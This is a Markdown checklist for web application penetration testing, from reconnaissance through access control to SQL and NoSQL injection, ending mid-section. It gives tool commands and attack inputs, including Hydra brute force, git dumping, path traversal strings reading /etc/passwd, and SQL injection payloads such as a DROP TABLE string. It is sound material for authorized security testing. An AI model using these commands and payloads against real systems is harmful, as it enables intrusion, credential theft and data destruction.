# Comprehensive Web Application Security Testing Checklist

## Phase 1: Reconnaissance & Information Gathering

### 1.1 Target Discovery & Enumeration

- [ ] **Subdomain enumeration** using tools like Subfinder, Amass, or Assetfinder
  - **Tools**: [Subfinder](https://github.com/projectdiscovery/subfinder), [Amass](https://github.com/OWASP/Amass), [Assetfinder](https://github.com/tomnomnom/assetfinder)
  - **How-to**: `subfinder -d target.com -all | tee subdomains.txt`
  - **Alternative**: [Sublist3r](https://github.com/aboul3la/Sublist3r): `python sublist3r.py -d target.com`

- [ ] **DNS enumeration** to identify all DNS records (A, AAAA, CNAME, MX, TXT, NS)
  - **Tools**: [DNSRecon](https://github.com/darkoperator/dnsrecon), [Fierce](https://github.com/mschwager/fierce), [DNSEnum](https://github.com/fwaeytens/dnsenum)
  - **How-to**: `dnsrecon -d target.com -a` or `fierce --domain target.com`
  - **Online**: [DNSDumpster](https://dnsdumpster.com/), [SecurityTrails](https://securitytrails.com/)

- [ ] **Port scanning** with Nmap to identify open services beyond HTTP/HTTPS
  - **Tools**: [Nmap](https://nmap.org/), [Masscan](https://github.com/robertdavidgraham/masscan), [RustScan](https://github.com/RustScan/RustScan)
  - **How-to**: `nmap -sS -sV -O -A target.com` or `rustscan -a target.com -- -sV`
  - **Fast scan**: `masscan -p1-65535 target.com --rate=1000`

- [ ] **Service fingerprinting** to identify web server, technologies, and versions
  - **Tools**: [Wappalyzer](https://www.wappalyzer.com/), [WhatWeb](https://github.com/urbanadventurer/WhatWeb), [HTTPrint](https://github.com/urbanadventurer/WhatWeb)
  - **How-to**: `whatweb target.com` or browser extension Wappalyzer
  - **Alternative**: `curl -I target.com` (manual header analysis)

- [ ] **Certificate transparency** logs analysis using crt.sh or Censys
  - **Tools**: [crt.sh](https://crt.sh/), [Censys](https://censys.io/), [Certificate Transparency Monitor](https://developers.facebook.com/tools/ct/)
  - **How-to**: Visit `https://crt.sh/?q=target.com` or use API: `curl -s "https://crt.sh/?q=target.com&output=json"`
  - **Tool**: [Certspotter](https://github.com/SSLMate/certspotter): `certspotter -domain target.com`

- [ ] **Search engine reconnaissance** using Google dorking and specialized search engines
  - **Tools**: [Google](https://www.google.com/), [Shodan](https://www.shodan.io/), [Bing](https://www.bing.com/)
  - **How-to**: `site:target.com filetype:pdf`, `inurl:admin site:target.com`
  - **Advanced**: [GHDB](https://www.exploit-db.com/google-hacking-database), [DorkSearch](https://dorksearch.com/)

### 1.2 Web Application Fingerprinting

- [ ] **Technology stack identification** using Wappalyzer, BuiltWith, or manual analysis
  - **Tools**: [Wappalyzer](https://www.wappalyzer.com/), [BuiltWith](https://builtwith.com/), [Retire.js](https://retirejs.github.io/retire.js/)
  - **How-to**: Browser extension or `retire --js --outputformat json --outputpath .`
  - **CLI**: [webtech](https://github.com/ShielderSec/webtech): `webtech -u target.com`

- [ ] **Web server identification** and version detection
  - **Tools**: [Httprint](https://github.com/urbanadventurer/WhatWeb), [Nmap](https://nmap.org/), [WafW00f](https://github.com/EnableSecurity/wafw00f)
  - **How-to**: `nmap --script http-server-header target.com` or `curl -I target.com`
  - **Advanced**: `nmap --script http-methods target.com`

- [ ] **Framework detection** (React, Angular, Laravel, Django, etc.)
  - **Tools**: Browser DevTools, [Wappalyzer](https://www.wappalyzer.com/), Source code analysis
  - **How-to**: Check JavaScript files, meta tags, and HTTP headers
  - **Manual**: View page source for framework-specific comments or file structures

- [ ] **Content Management System** identification (WordPress, Joomla, Drupal)
  - **Tools**: [CMSmap](https://github.com/Dionach/CMSmap), [WPScan](https://github.com/wpscanteam/wpscan), [Joomscan](https://github.com/OWASP/joomscan)
  - **How-to**: `wpscan --url target.com` or `python3 cmsmap.py -t target.com`
  - **Drupal**: [Droopescan](https://github.com/droope/droopescan): `droopescan scan drupal -u target.com`

- [ ] **Third-party integrations** and plugins identification
  - **Tools**: Browser DevTools Network tab, [WPScan](https://github.com/wpscanteam/wpscan) for WordPress
  - **How-to**: Monitor network requests, analyze loaded scripts and stylesheets
  - **WordPress**: `wpscan --url target.com --enumerate p` (enumerate plugins)

- [ ] **JavaScript libraries** and dependencies analysis
  - **Tools**: [Retire.js](https://retirejs.github.io/retire.js/), [Snyk](https://snyk.io/), Browser DevTools
  - **How-to**: `retire --js --outputformat json`, check `/js/` directories
  - **Alternative**: [JSNice](http://www.jsnice.org/) for deobfuscation

### 1.3 Content Discovery

- [ ] **Directory and file enumeration** using tools like Gobuster, Dirbuster, or Feroxbuster
  - **Tools**: [Gobuster](https://github.com/OJ/gobuster), [Feroxbuster](https://github.com/epi052/feroxbuster), [Dirsearch](https://github.com/maurosoria/dirsearch)
  - **How-to**: `gobuster dir -u target.com -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt`
  - **Alternative**: `feroxbuster -u target.com -w /usr/share/seclists/Discovery/Web-Content/common.txt`

- [ ] **Hidden parameters discovery** using Arjun, ParamSpider, or Parameth
  - **Tools**: [Arjun](https://github.com/s0md3v/Arjun), [ParamSpider](https://github.com/devanshbatham/ParamSpider), [Parameth](https://github.com/maK-/parameth)
  - **How-to**: `python3 arjun.py -u target.com` or `python3 paramspider.py -d target.com`
  - **Manual**: Use Burp Suite Intruder with parameter wordlists

- [ ] **Backup file detection** using tools like BFAC or custom wordlists
  - **Tools**: [BFAC](https://github.com/mazen160/bfac), [DirBuster](https://www.owasp.org/index.php/Category:OWASP_DirBuster_Project)
  - **How-to**: `python bfac --url target.com --level 4`
  - **Manual**: Test for `.bak`, `.backup`, `.old`, `.orig`, `~` files

- [ ] **Administrative interfaces** location (admin panels, debug interfaces)
  - **Tools**: [Gobuster](https://github.com/OJ/gobuster) with admin wordlists, Manual enumeration
  - **How-to**: `gobuster dir -u target.com -w /usr/share/seclists/Discovery/Web-Content/CMS/wordpress.fuzz.txt`
  - **Common paths**: `/admin`, `/administrator`, `/wp-admin`, `/phpmyadmin`

- [ ] **API endpoints discovery** through documentation, JavaScript files, or fuzzing
  - **Tools**: [Kiterunner](https://github.com/assetnote/kiterunner), [FFuF](https://github.com/ffuf/ffuf), [Gobuster](https://github.com/OJ/gobuster)
  - **How-to**: `kr scan target.com -w routes-large.kite` or analyze JS files for endpoints
  - **Manual**: Check `/api/v1/`, `/rest/`, `/graphql` paths

- [ ] **Development artifacts** search (.git, .svn, .env files, source maps)
  - **Tools**: [GitTools](https://github.com/internetwache/GitTools), [dvcs-ripper](https://github.com/kost/dvcs-ripper)
  - **How-to**: `python3 gitdumper.py target.com/.git/ output/` or check for `.env`, `web.config`
  - **Source maps**: Check for `.map` files in browser DevTools Sources tab

### 1.4 Information Leakage Assessment

- [ ] **robots.txt, sitemap.xml** analysis for disclosed paths
  - **Tools**: Browser, [curl](https://curl.se/), [wget](https://www.gnu.org/software/wget/)
  - **How-to**: `curl target.com/robots.txt` and `curl target.com/sitemap.xml`
  - **Automated**: Include in directory enumeration wordlists

- [ ] **crossdomain.xml, clientaccesspolicy.xml** review for CORS misconfigurations
  - **Tools**: Browser, curl, [CORStest](https://github.com/RUB-NDS/CORStest)
  - **How-to**: `curl target.com/crossdomain.xml` and analyze allowed domains
  - **Testing**: Check for wildcard (*) domains or overly permissive policies

- [ ] **Source code comments** analysis for sensitive information
  - **Tools**: Browser DevTools, [Grep](https://www.gnu.org/software/grep/), [JSParser](https://github.com/nahamsec/JSParser)
  - **How-to**: View page source, search for `<!--`, `//`, `/*` comments
  - **Automated**: `curl -s target.com | grep -i "password\|api\|key\|token"`

- [ ] **Error messages** analysis for information disclosure
  - **Tools**: [Burp Suite](https://portswigger.net/burp), Manual testing
  - **How-to**: Send malformed requests, invalid parameters, SQL syntax
  - **Test cases**: `'`, `"`, `<script>`, `../../../etc/passwd`

- [ ] **HTTP headers** analysis for version disclosure and security headers
  - **Tools**: curl, [securityheaders.com](https://securityheaders.com/), [Mozilla Observatory](https://observatory.mozilla.org/)
  - **How-to**: `curl -I target.com` or online header analyzers
  - **Check for**: Server versions, X-Powered-By, security headers

- [ ] **Cookie analysis** for secure flags and sensitive data exposure
  - **Tools**: Browser DevTools, [Burp Suite](https://portswigger.net/burp)
  - **How-to**: Check Application tab in DevTools, analyze cookie attributes
  - **Look for**: Missing Secure, HttpOnly, SameSite flags; sensitive data in values

### 1.5 External Intelligence Gathering

- [ ] **Shodan** search for exposed services and vulnerabilities
  - **Tools**: [Shodan](https://www.shodan.io/), [Shodan CLI](https://github.com/achillean/shodan-python)
  - **How-to**: `shodan search "target.com"` or web interface search
  - **Queries**: `ssl:"target.com"`, `org:"Organization Name"`

- [ ] **Wayback Machine** analysis using tools like Gau or Waybackurls
  - **Tools**: [Gau](https://github.com/lc/gau), [Waybackurls](https://github.com/tomnomnom/waybackurls), [Internet Archive](https://archive.org/)
  - **How-to**: `echo target.com | gau` or `echo target.com | waybackurls`
  - **Analysis**: Look for old admin panels, deprecated endpoints, leaked files

- [ ] **Leaked credentials** search using tools like PwnDB or Have I Been Pwned API
  - **Tools**: [PwnDB](http://pwndb2am4tzkvold.onion/) (Tor), [HIBP API](https://haveibeenpwned.com/API/v3), [Dehashed](https://dehashed.com/)
  - **How-to**: Search for organization email domains in breach databases
  - **Legal**: Only search for your own organization's data

- [ ] **Social media** and public repositories reconnaissance
  - **Tools**: [Maltego](https://www.maltego.com/), [theHarvester](https://github.com/laramies/theHarvester), [Sherlock](https://github.com/sherlock-project/sherlock)
  - **How-to**: `python3 theHarvester.py -d target.com -l 100 -b all`
  - **GitHub**: Search for organization name, API keys, credentials

- [ ] **WHOIS** information gathering for domain and organization details
  - **Tools**: [whois](https://linux.die.net/man/1/whois), [DomainTools](https://whois.domaintools.com/), [WhoisXML API](https://www.whoisxmlapi.com/)
  - **How-to**: `whois target.com` or use online WHOIS lookup tools
  - **Analysis**: Contact information, name servers, registration dates

- [ ] **Email harvesting** from public sources and breach databases
  - **Tools**: [theHarvester](https://github.com/laramies/theHarvester), [Hunter.io](https://hunter.io/), [Phonebook.cz](https://phonebook.cz/)
  - **How-to**: `python3 theHarvester.py -d target.com -b hunter`
  - **Sources**: LinkedIn, company websites, job postings

## Phase 2: Network & Infrastructure Security

### 2.1 Network Protocol Testing

- [ ] **ICMP filtering** assessment for network reconnaissance prevention
  - **Tools**: [ping](https://linux.die.net/man/8/ping), [Nmap](https://nmap.org/), [hping3](https://github.com/antirez/hping)
  - **How-to**: `ping target.com` and `nmap -PE target.com`
  - **Advanced**: `hping3 -1 target.com` (ICMP ping)

- [ ] **UDP services enumeration** using tools like UDP-proto-scanner
  - **Tools**: [UDP-proto-scanner](https://github.com/portcullislabs/udp-proto-scanner), [Nmap](https://nmap.org/), [Unicornscan](https://sourceforge.net/projects/unicornscan/)
  - **How-to**: `nmap -sU --top-ports 100 target.com` or `python udp-proto-scanner.py target.com`
  - **Common ports**: 53 (DNS), 161 (SNMP), 123 (NTP)

- [ ] **IPv6 configuration** testing if dual-stack is implemented
  - **Tools**: [Nmap](https://nmap.org/), [ping6](https://linux.die.net/man/8/ping), [THC-IPv6](https://github.com/vanhauser-thc/thc-ipv6)
  - **How-to**: `nmap -6 target.com` or `ping6 target.com`
  - **Discovery**: `nmap -6 --script ipv6-multicast-mld-list target.com`

- [ ] **Network segmentation** testing between different application tiers
  - **Tools**: [Nmap](https://nmap.org/), [Traceroute](https://linux.die.net/man/8/traceroute), Network analysis
  - **How-to**: Map network topology, test access between segments
  - **Testing**: Attempt to reach internal services from DMZ

- [ ] **Firewall rule** effectiveness assessment
  - **Tools**: [Nmap](https://nmap.org/), [Firewalk](http://packetfactory.openwall.net/projects/firewalk/), [FTester](http://www.inversepath.com/ftester.html)
  - **How-to**: `nmap -sA target.com` (ACK scan to detect firewall rules)
  - **Bypass**: Test different protocols, fragmentation, timing

### 2.2 SSL/TLS Security Assessment

- [ ] **SSL/TLS configuration** testing using SSLyze, testssl.sh, or SSL Labs
  - **Tools**: [testssl.sh](https://testssl.sh/), [SSLyze](https://github.com/nabla-c0d3/sslyze), [SSL Labs](https://www.ssllabs.com/ssltest/)
  - **How-to**: `./testssl.sh target.com` or online SSL Labs scan
  - **Comprehensive**: `sslyze --regular target.com`

- [ ] **Certificate validation** including chain of trust and revocation status
  - **Tools**: [OpenSSL](https://www.openssl.org/), [testssl.sh](https://testssl.sh/), Browser certificate viewer
  - **How-to**: `openssl s_client -connect target.com:443 -showcerts`
  - **Validation**: Check expiry, subject alternative names, CA trust

- [ ] **Weak cipher suites** and protocol versions identification
  - **Tools**: [testssl.sh](https://testssl.sh/), [Nmap](https://nmap.org/) SSL scripts, [SSLScan](https://github.com/rbsec/sslscan)
  - **How-to**: `nmap --script ssl-enum-ciphers target.com` or `sslscan target.com`
  - **Check for**: SSLv2, SSLv3, TLS 1.0, weak ciphers (RC4, DES)

- [ ] **Perfect Forward Secrecy** implementation verification
  - **Tools**: [testssl.sh](https://testssl.sh/), [SSL Labs](https://www.ssllabs.com/ssltest/)
  - **How-to**: Check for ECDHE/DHE cipher suites in SSL/TLS configuration
  - **Validation**: Ensure ephemeral key exchange is supported

- [ ] **HSTS implementation** and configuration assessment
  - **Tools**: curl, Browser DevTools, [testssl.sh](https://testssl.sh/)
  - **How-to**: `curl -I target.com | grep -i strict-transport-security`
  - **Check**: max-age value, includeSubDomains, preload directives

- [ ] **Certificate transparency** compliance verification
  - **Tools**: [crt.sh](https://crt.sh/), [Certificate Transparency Monitor](https://developers.facebook.com/tools/ct/), Browser CT extensions
  - **How-to**: Search certificate logs for domain certificates
  - **Validation**: Ensure certificates are logged in CT logs

### 2.3 Email Security Configuration

- [ ] **SPF record** configuration and effectiveness testing
  - **Tools**: [MXToolbox](https://mxtoolbox.com/spf.aspx), [SPF Surveyor](https://www.kitterman.com/spf/validate.html), [dig](https://linux.die.net/man/1/dig)
  - **How-to**: `dig TXT target.com | grep spf` or online SPF checkers
  - **Testing**: Send test emails to verify SPF validation

- [ ] **DKIM signature** validation and key management assessment
  - **Tools**: [MXToolbox DKIM Lookup](https://mxtoolbox.com/dkim.aspx), [DKIM Validator](https://dkimvalidator.com/)
  - **How-to**: `dig TXT selector._domainkey.target.com` (replace selector)
  - **Testing**: Send emails and verify DKIM signatures

- [ ] **DMARC policy** implementation and reporting configuration
  - **Tools**: [MXToolbox DMARC](https://mxtoolbox.com/dmarc.aspx), [DMARC Analyzer](https://www.dmarcanalyzer.com/), [dmarcian](https://dmarcian.com/)
  - **How-to**: `dig TXT _dmarc.target.com` or online DMARC checkers
  - **Check**: Policy (none/quarantine/reject), reporting URIs

- [ ] **Email spoofing** resistance testing using tools like spoofcheck
  - **Tools**: [spoofcheck](https://github.com/BishopFox/spoofcheck), [checkdmarc](https://github.com/domainaware/checkdmarc)
  - **How-to**: `python spoofcheck.py target.com` or manual email testing
  - **Testing**: Send spoofed emails to test protection effectiveness

- [ ] **Mail server security** headers and configuration review
  - **Tools**: [Nmap](https://nmap.org/) SMTP scripts, [telnet](https://linux.die.net/man/1/telnet), [swaks](https://github.com/jetmore/swaks)
  - **How-to**: `nmap --script smtp-* target.com` or `telnet target.com 25`
  - **Check**: SMTP banner, supported commands, relay testing

## Phase 3: Authentication & Session Management

### 3.1 User Registration Security

- [ ] **Duplicate registration** prevention mechanisms testing
  - **Tools**: [Burp Suite](https://portswigger.net/burp), [OWASP ZAP](https://www.zaproxy.org/), Manual testing
  - **How-to**: Attempt to register with existing username/email
  - **Testing**: Try variations (case sensitivity, special characters)

- [ ] **Username enumeration** through registration process
  - **Tools**: [Burp Suite Intruder](https://portswigger.net/burp/documentation/desktop/tools/intruder), [FFuF](https://github.com/ffuf/ffuf)
  - **How-to**: Monitor response differences for existing vs non-existing users
  - **Indicators**: Response time, message differences, HTTP status codes

- [ ] **Email verification** process security and bypass attempts
  - **Tools**: [Burp Suite](https://portswigger.net/burp), Email clients, [temp-mail](https://temp-mail.org/)
  - **How-to**: Test verification link manipulation, token reuse, expiration
  - **Bypass**: Try accessing account before verification, token prediction

- [ ] **Password policy** strength and enforcement testing
  - **Tools**: Manual testing, [Burp Suite](https://portswigger.net/burp)
  - **How-to**: Test minimum length, complexity requirements, common passwords
  - **Weak patterns**: Test "password123", "123456", dictionary words

- [ ] **Account activation** link security and expiration testing
  - **Tools**: [Burp Suite](https://portswigger.net/burp), Manual testing
  - **How-to**: Test link reuse, expiration, token manipulation
  - **Security**: Check for predictable tokens, race conditions

- [ ] **Disposable email** address filtering effectiveness
  - **Tools**: [10minutemail](https://10minutemail.com/), [Guerrilla Mail](https://www.guerrillamail.com/), [temp-mail](https://temp-mail.org/)
  - **How-to**: Attempt registration with disposable email services
  - **Bypass**: Try lesser-known disposable email providers

- [ ] **Rate limiting** on registration attempts
  - **Tools**: [Burp Suite Intruder](https://portswigger.net/burp/documentation/desktop/tools/intruder), [FFuF](https://github.com/ffuf/ffuf), Custom scripts
  - **How-to**: Send multiple registration requests rapidly
  - **Testing**: Different IP addresses, session tokens, user agents

- [ ] **CAPTCHA** implementation and bypass techniques
  - **Tools**: [2captcha](https://2captcha.com/), [OCR tools](https://github.com/tesseract-ocr/tesseract), [captcha22](https://github.com/c0ny1/captcha22)
  - **How-to**: Test CAPTCHA reuse, OCR bypass, rate limiting effectiveness
  - **Bypass**: Image manipulation, audio CAPTCHA analysis

### 3.2 Authentication Mechanism Testing

- [ ] **Username enumeration** through login error messages
  - **Tools**: [Burp Suite](https://portswigger.net/burp), [username-anarchy](https://github.com/urbanadventurer/username-anarchy), [Enumerate](https://github.com/Raikia/UhOh365)
  - **How-to**: Compare error messages for valid vs invalid usernames
  - **Timing**: Measure response time differences

- [ ] **Password brute force** protection and account lockout mechanisms
  - **Tools**: [Hydra](https://github.com/vanhauser-thc/thc-hydra), [Medusa](https://github.com/jmk-foofus/medusa), [Burp Suite Intruder](https://portswigger.net/burp)
  - **How-to**: `hydra -l admin -P /usr/share/wordlists/rockyou.txt target.com http-post-form`
  - **Testing**: Account lockout thresholds, lockout duration, bypass methods

- [ ] **Multi-factor authentication** implementation and bypass techniques
  - **Tools**: Manual testing, [Burp Suite](https://portswigger.net/burp), SMS/TOTP apps
  - **How-to**: Test MFA enforcement, backup codes, recovery process
  - **Bypass**: Session management flaws, direct URL access, race conditions

- [ ] **Account recovery** process security and information leakage
  - **Tools**: [Burp Suite](https://portswigger.net/burp), Manual testing
  - **How-to**: Test password reset process, security questions, token security
  - **Issues**: Predictable tokens, user enumeration, weak security questions

- [ ] **"Remember me"** functionality security implementation
  - **Tools**: [Burp Suite](https://portswigger.net/burp), Browser DevTools
  - **How-to**: Analyze remember me tokens, cookie security, expiration
  - **Testing**: Token predictability, session hijacking, secure storage

- [ ] **Session fixation** vulnerability assessment
  - **Tools**: [Burp Suite](https://portswigger.net/burp), Manual testing
  - **How-to**: Test if session ID changes after authentication
  - **Exploit**: Provide pre-authentication session ID to victim

- [ ] **Concurrent session** handling and management
  - **Tools**: Multiple browsers/devices, [Burp Suite](https://portswigger.net/burp)
  - **How-to**: Login from multiple locations, test session invalidation
  - **Issues**: Multiple active sessions, session management policies

- [ ] **Authentication bypass** through parameter manipulation
  - **Tools**: [Burp Suite](https://portswigger.net/burp), [OWASP ZAP](https://www.zaproxy.org/)
  - **How-to**: Modify authentication parameters, cookies, headers
  - **Testing**: Admin flags, user ID manipulation, privilege escalation

### 3.3 Advanced Authentication Testing

- [ ] **OAuth/OpenID Connect** implementation security
  - **Tools**: [Burp Suite](https://portswigger.net/burp), [OAuth Security Testing](https://github.com/dxa4481/oauth_security_testing), [jwt.io](https://jwt.io/)
  - **How-to**: Test authorization code flow, token validation, scope abuse
  - **Issues**: Open redirects, state parameter attacks, token leakage

- [ ] **SAML authentication** configuration and response tampering
  - **Tools**: [SAML Raider](https://github.com/CompassSecurity/SAMLRaider), [Burp Suite](https://portswigger.net/burp), [SAMLRewriter](https://github.com/Aon-eSolutions/SAMLRewriter)
  - **How-to**: Intercept and modify SAML responses, test signature validation
  - **Testing**: XML signature wrapping, assertion replay, attribute injection

- [ ] **JWT token** security including algorithm confusion and secret brute forcing
  - **Tools**: [jwt_tool](https://github.com/ticarpi/jwt_tool), [JohnTheRipper](https://github.com/openwall/john), [Hashcat](https://hashcat.net/hashcat/)
  - **How-to**: `python3 jwt_tool.py -t target.com -rc "jwt_token_here"`
  - **Testing**: Algorithm switching (RS256 to HS256), weak secrets, claim manipulation

- [ ] **API key** management and exposure assessment
  - **Tools**: [TruffleHog](https://github.com/trufflesecurity/truffleHog), [GitLeaks](https://github.com/zricethezav/gitleaks), [KeyHacks](https://github.com/streaak/keyhacks)
  - **How-to**: Search for API keys in source code, configuration files
  - **Testing**: Key rotation, access controls, usage monitoring

- [ ] **Single Sign-On (SSO)** implementation security
  - **Tools**: [Burp Suite](https://portswigger.net/burp), SSO-specific tools
  - **How-to**: Test federation trust, assertion validation, logout process
  - **Issues**: Trust relationships, assertion replay, logout failures

- [ ] **Biometric authentication** bypass techniques if implemented
  - **Tools**: Device-specific testing tools, Manual testing
  - **How-to**: Test fallback mechanisms, spoofing resistance
  - **Testing**: Fingerprint spoofing, face recognition bypass

- [ ] **Time-based OTP** security and race condition testing
  - **Tools**: [TOTP tools](https://github.com/google/google-authenticator), Manual testing, [Burp Suite](https://portswigger.net/burp)
  - **How-to**: Test OTP validation timing, reuse prevention, brute force protection
  - **Issues**: Race conditions, insufficient rate limiting, predictable codes

### 3.4 Session Management Security

- [ ] **Session token** entropy and predictability analysis
  - **Tools**: [Burp Suite Sequencer](https://portswigger.net/burp/documentation/desktop/tools/sequencer), [ENT](https://www.fourmilab.ch/random/), Statistical analysis
  - **How-to**: Collect multiple session tokens, analyze randomness
  - **Testing**: PRNG weaknesses, sequential patterns, insufficient entropy

- [ ] **Session fixation** and hijacking vulnerability testing
  - **Tools**: [Burp Suite](https://portswigger.net/burp), Manual testing
  - **How-to**: Test session ID handling across authentication state changes
  - **Exploit**: XSS to steal session cookies, network sniffing

- [ ] **Session timeout** configuration and enforcement
  - **Tools**: [Burp Suite](https://portswigger.net/burp), Manual timing tests, Browser automation
  - **How-to**: Test idle timeout, absolute timeout, concurrent session limits
  - **Testing**: Leave session idle, test maximum session duration, login from multiple devices

- [ ] **Secure cookie** flags implementation (HttpOnly, Secure, SameSite)
  - **Tools**: Browser DevTools, [Burp Suite](https://portswigger.net/burp), [Cookie-Flags](https://github.com/AonCyberLabs/Cookie-Flags)
  - **How-to**: Inspect cookies in DevTools Application tab, check flags
  - **Testing**: XSS cookie theft (HttpOnly), man-in-the-middle (Secure), CSRF (SameSite)

- [ ] **Cross-Site Request Forgery (CSRF)** protection mechanisms
  - **Tools**: [Burp Suite](https://portswigger.net/burp), [CSRFTester](https://github.com/sectooladdict/CSRFTester), Manual testing
  - **How-to**: Remove CSRF tokens, test token validation, cross-origin requests
  - **Bypass**: Double-submit cookies, referrer header validation, SameSite bypass

- [ ] **Session invalidation** on logout and password change
  - **Tools**: [Burp Suite](https://portswigger.net/burp), Multiple browsers
  - **How-to**: Test if sessions remain valid after logout/password change
  - **Testing**: Use old session tokens, concurrent session handling

- [ ] **Concurrent session** management and termination
  - **Tools**: Multiple browsers/devices, [Burp Suite](https://portswigger.net/burp)
  - **How-to**: Login from multiple locations, test session limits
  - **Policy**: Single session enforcement, session monitoring, automatic termination

- [ ] **Session storage** security on client and server side
  - **Tools**: Browser DevTools, [Burp Suite](https://portswigger.net/burp), Database analysis
  - **How-to**: Inspect client storage (localStorage, sessionStorage), server session handling
  - **Security**: Encryption at rest, secure transmission, access controls

## Phase 4: Authorization & Access Control

### 4.1 Vertical Access Control Testing

- [ ] **Privilege escalation** through parameter manipulation
  - **Tools**: [Burp Suite](https://portswigger.net/burp), [OWASP ZAP](https://www.zaproxy.org/), [Authz0](https://github.com/hahwul/authz0)
  - **How-to**: Modify user ID, role parameters, hidden form fields
  - **Testing**: `user_id=1` to `user_id=2`, `role=user` to `role=admin`

- [ ] **Direct object reference** testing (IDOR) for sensitive resources
  - **Tools**: [Burp Suite Intruder](https://portswigger.net/burp), [Autorize](https://github.com/Quitten/Autorize), [AuthMatrix](https://github.com/SecurityInnovation/AuthMatrix)
  - **How-to**: Enumerate object IDs, test access to other users' resources
  - **Examples**: `/user/123/profile`, `/document/456.pdf`, `/api/orders/789`

- [ ] **Administrative function** access with lower-privileged accounts
  - **Tools**: [Burp Suite](https://portswigger.net/burp), [AuthMatrix](https://github.com/SecurityInnovation/AuthMatrix)
  - **How-to**: Access admin URLs with regular user session
  - **Paths**: `/admin/`, `/management/`, `/dashboard/admin`

- [ ] **API endpoint** authorization bypass testing
  - **Tools**: [Postman](https://www.postman.com/), [Insomnia](https://insomnia.rest/), [HTTPie](https://httpie.io/)
  - **How-to**: Test API endpoints with different user roles, missing tokens
  - **Methods**: GET, POST, PUT, DELETE with various authorization levels

- [ ] **File system access** control verification
  - **Tools**: [Burp Suite](https://portswigger.net/burp), [DotDotPwn](https://github.com/wireghoul/dotdotpwn), [Path Traversal Scanner](https://github.com/wireghoul/dotdotpwn)
  - **How-to**: Test path traversal, file inclusion, direct file access
  - **Payloads**: `../../../etc/passwd`, `..\..\windows\system32\drivers\etc\hosts`

- [ ] **Database access** control testing through application layer
  - **Tools**: [SQLMap](https://github.com/sqlmapproject/sqlmap), [Burp Suite](https://portswigger.net/burp)
  - **How-to**: Test SQL injection with different user privileges
  - **Testing**: Database user permissions, stored procedure access

### 4.2 Horizontal Access Control Testing

- [ ] **User impersonation** through account parameter manipulation
  - **Tools**: [Burp Suite](https://portswigger.net/burp), [Autorize](https://github.com/Quitten/Autorize)
  - **How-to**: Change user identifiers in requests, cookies, headers
  - **Testing**: Modify `user_id`, `account_id`, `profile_id` parameters

- [ ] **Cross-user data access** through ID manipulation
  - **Tools**: [Burp Suite Intruder](https://portswigger.net/burp), [FFuF](https://github.com/ffuf/ffuf)
  - **How-to**: Enumerate user IDs, test access to other users' data
  - **Methodology**: Create multiple test accounts, cross-test access

- [ ] **Shared resource** access control testing
  - **Tools**: [Burp Suite](https://portswigger.net/burp), Manual testing
  - **How-to**: Test shared documents, group resources, collaborative features
  - **Scenarios**: Shared folders, team projects, public/private resources

- [ ] **Multi-tenant** isolation verification if applicable
  - **Tools**: [Burp Suite](https://portswigger.net/burp), Database analysis, Network analysis
  - **How-to**: Test tenant data isolation, subdomain/path-based separation
  - **Testing**: Cross-tenant data access, shared infrastructure isolation

- [ ] **Group-based access** control testing
  - **Tools**: [Burp Suite](https://portswigger.net/burp), [AuthMatrix](https://github.com/SecurityInnovation/AuthMatrix)
  - **How-to**: Test group membership validation, role inheritance
  - **Scenarios**: Department access, project teams, permission groups

- [ ] **Resource ownership** validation and enforcement
  - **Tools**: [Burp Suite](https://portswigger.net/burp), Manual testing
  - **How-to**: Test object ownership checks, transfer ownership scenarios
  - **Testing**: File ownership, created content, purchased items

### 4.3 Function-Level Access Control

- [ ] **Hidden functionality** access without proper authorization
  - **Tools**: [Gobuster](https://github.com/OJ/gobuster), [Feroxbuster](https://github.com/epi052/feroxbuster), [Burp Suite](https://portswigger.net/burp)
  - **How-to**: Discover hidden endpoints, test direct URL access
  - **Discovery**: Directory enumeration, JavaScript analysis, sitemap parsing

- [ ] **Administrative interface** access control testing
  - **Tools**: [Burp Suite](https://portswigger.net/burp), [Gobuster](https://github.com/OJ/gobuster)
  - **How-to**: Test admin panel access with non-admin accounts
  - **Paths**: `/admin/`, `/administrator/`, `/wp-admin/`, `/phpmyadmin/`

- [ ] **API method** level authorization verification
  - **Tools**: [Postman](https://www.postman.com/), [Insomnia](https://insomnia.rest/), [REST-Attacker](https://github.com/RUB-NDS/REST-Attacker)
  - **How-to**: Test HTTP methods (GET, POST, PUT, DELETE) with different privileges
  - **Matrix**: Create authorization matrix for all endpoints and methods

- [ ] **File upload/download** access control testing
  - **Tools**: [Burp Suite](https://portswigger.net/burp), [Upload Scanner](https://github.com/modzero/mod0BurpUploadScanner)
  - **How-to**: Test file upload restrictions, download access controls
  - **Bypass**: File type validation, path manipulation, direct file access

- [ ] **Report generation** and data export authorization
  - **Tools**: [Burp Suite](https://portswigger.net/burp), Manual testing
  - **How-to**: Test report access, data export permissions, filtering controls
  - **Testing**: Cross-user report access, data leakage through reports

- [ ] **Sensitive operation** re-authentication requirements
  - **Tools**: [Burp Suite](https://portswigger.net/burp), Manual testing
  - **How-to**: Test if sensitive operations require password confirmation
  - **Operations**: Password change, email change, financial transactions

## Phase 5: Input Validation & Injection Testing

### 5.1 SQL Injection Testing

- [ ] **Classic SQL injection** in all input parameters
  - **Tools**: [SQLMap](https://github.com/sqlmapproject/sqlmap), [Burp Suite](https://portswigger.net/burp), [jSQL Injection](https://github.com/ron190/jsql-injection)
  - **How-to**: `sqlmap -u "http://target.com/page?id=1" --dbs`
  - **Manual payloads**: `'`, `"`, `'; DROP TABLE users; --`, `1' OR '1'='1`

- [ ] **Blind SQL injection** time-based and boolean-based
  - **Tools**: [SQLMap](https://github.com/sqlmapproject/sqlmap), [Burp Suite Intruder](https://portswigger.net/burp)
  - **How-to**: `sqlmap -u "target.com" --technique=T` (time-based)
  - **Payloads**: `'; WAITFOR DELAY '00:00:05'; --`, `' AND 1=1 --` vs `' AND 1=2 --`

- [ ] **Second-order SQL injection** through stored data
  - **Tools**: [SQLMap](https://github.com/sqlmapproject/sqlmap), [Burp Suite](https://portswigger.net/burp), Manual testing
  - **How-to**: Store malicious payloads, trigger execution in different context
  - **Scenario**: User profile data displayed in admin panel, stored search queries

- [ ] **NoSQL injection** for MongoDB, CouchDB, and other NoSQL databases
  - **Tools**: [NoSQLMap](https://github.com/codingo/NoSQLMap), [Burp Suite](https://portswigger.net/burp), [NoSQL Injection Scanner](https://github.com/Charlie-belmer/nosqli)
  - **How-to**: `python nosqlmap.py -u target.com -p username`
